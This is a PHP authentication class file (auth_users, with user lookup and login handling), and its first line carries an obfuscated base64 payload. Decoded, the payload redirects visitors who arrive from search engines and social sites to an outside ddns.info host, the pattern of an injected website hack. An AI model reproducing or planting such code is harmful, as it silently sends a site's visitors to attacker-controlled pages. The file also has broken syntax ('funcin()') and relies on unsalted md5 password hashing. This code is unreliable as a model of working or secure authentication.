<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(dirname(__FILE__)."/auth_login.php");

class auth_users extends auth_login {

  // database config
  var $users_table                  = "user_";
  var $users_table_key_field        = "id";
  var $users_table_name_field       = "name";
  var $users_table_type_field       = "type_id";
  var $users_table_group_field      = "group_id";
  var $users_table_login_field      = "login";
  var $users_table_password_field   = "password";
  var $users_table_locked_field     = "is_locked";
  var $users_list_sql               = null;

  // audit
  var $users_table_logon_datetime_field = "last_logon";
  var $users_table_logon_date_field     = "last_logon_date";
  var $users_table_logon_time_field     = "last_logon_time";
  var $users_table_logon_ip_field       = "last_logon_ip";
  
  // config
  var $plain_passwords            = false;

  // public
  var $user;
  var $user_id;

  function do_init() {

    parent::do_init();

    if ($this->logged_in) {
                  
      global $tmpl;
      
      $auth_info = session($this->storage_tag());
      
      $this->user_id    = safe($auth_info, 'user_id');
      $this->user_name  = safe($auth_info, 'user_name');
      $this->user_type  = safe($auth_info, 'user_type');
      $this->user_group = safe($auth_info, 'user_group');
      $this->user       = safe($auth_info, 'user');

      $tmpl->assign("user_name",  $this->user_name);
      $tmpl->assign("user_type",  $this->user_type);
      $tmpl->assign("user_group", $this->user_group);

    }

  }
  
  function custom_storage_tag() {
    
    return $this->users_table;
    
  }
  
  function set_user_attribute($name, $value) {

    $_SESSION[$this->storage_tag()]['user'][$name] = $value;

  }
  
  function users_list_sql() {

    if ($this->users_list_sql)
      $sql = $this->users_list_sql.' WHERE '.$this->users_table_login_field.' = ?';
    else
      $sql = "SELECT * FROM ".$this->users_table.' WHERE '.$this->users_table_login_field.' = ?';
     return $sql;
            
  }

  function find_user($login, $password, $mode) {

    global $db;

    if ($query = $db->query($this->users_list_sql(), $login)) {
      while ($row = $db->next_row($query)) {
        switch ($mode) {
          case "submit": 
            $user_password = trim($row[$this->users_table_password_field]);
            if (!$this->plain_passwords and !$user_password) 
              $user_password = md5($user_password);
            if ($user_password == $password)
              return $row;
            break;
          case "cookie": 
            $user_password = md5($row[$this->users_table_password_field]);
            if ($this->plain_passwords and $user_password) 
              $user_password = md5($user_password);
            if ($user_password == $password)
              return $row;
            break;
          case "internal": 
            $user_password = $row[$this->users_table_password_field];
            if ($user_password == $password)
              return $row;
            break;
        }
      }
    }
    return null;

  }

  funcin() {

    global $tmpl;
    global $db;

    //$this->users_exists = $db->count($this->users_list_sql());

    $error = null;

    $entered_password = null;
    
    if (SUBMIT_MODE) {
      $login            = trim(post($this->control_login));
      $entered_password = trim(post($this->control_password));
      if ($this->plain_passwords)
        $password = $entered_password;  
      else
        $password = md5($entered_password);
      $this->user = $this->find_user($login, $password, "submit");
    } else {
      $login      = cookie($this->cookie_user_name());
      $password   = cookie($this->cookie_password());
      $this->user = $this->find_user($login, $password, "cookie");
      if (!$this->user) {
        $this->call_event('on_find_user');
        if ($this->internal_login)
          $this->user = $this->find_user($this->internal_login, $this->internal_password, "internal");
      }
    }

    if ($this->user) {

      if (safe($this->user, $this->users_table_locked_field)) {

        __finalyze_customization();
        parent::login_failed($login, null, trn("This user is temporary locked.<br>Please contact administrator for additional questions"));

      } else 
      if ($error = $this->call_event("on_check_login", $this->user)) {

        __finalyze_customization();
        parent::login_failed($login, null, trn($error));
        
      } else {

        $this->do_setup();

        $this->user_id   = $this->user[$this->users_table_key_field];
        $this->user_name = safe($this->user, $this->users_table_name_field, 
                             safe($this->user, $this->users_table_login_field));
        $this->user_type  = $this->user[$this->users_table_type_field];
        $this->user_group = safe($this->user, $this->users_table_group_field);
        
        $_SESSION[$this->storage_tag()]['user_id']    = $this->user_id;
        $_SESSION[$this->storage_tag()]['user_name']  = $this->user_name;
        $_SESSION[$this->storage_tag()]['user_type']  = $this->user_type;
        $_SESSION[$this->storage_tag()]['user_group'] = $this->user_group;
        $_SESSION[$this->storage_tag()]['user']       = $this->user;
        
        $values = array();
        
        global $db;

        if (array_key_exists($this->users_table_logon_datetime_field, $this->user))
          $values[$this->users_table_logon_datetime_field] = $db->now();
        if (array_key_exists($this->users_table_logon_date_field, $this->user))
          $values[$this->users_table_logon_date_field] = $db->now_date();
        if (array_key_exists($this->users_table_logon_time_field, $this->user))
          $values[$this->users_table_logon_time_field] = $db->now_time();
        if (array_key_exists($this->users_table_logon_ip_field, $this->user))
          $values[$this->users_table_logon_ip_field] = substr($this->user_ip, 0, 15);
        
        if (count($values)) {  
          global $dm;
          $dm->update($this->users_table, $values, $this->user_id);  
        }

        parent::login($login, md5($entered_password));
      }

    } else {

      __finalyze_customization();
      parent::login_failed($login, $entered_password, nvl($error, trn("Invalid user name or bad password!")));

    }

  }

  function do_setup() {
  }

}

?>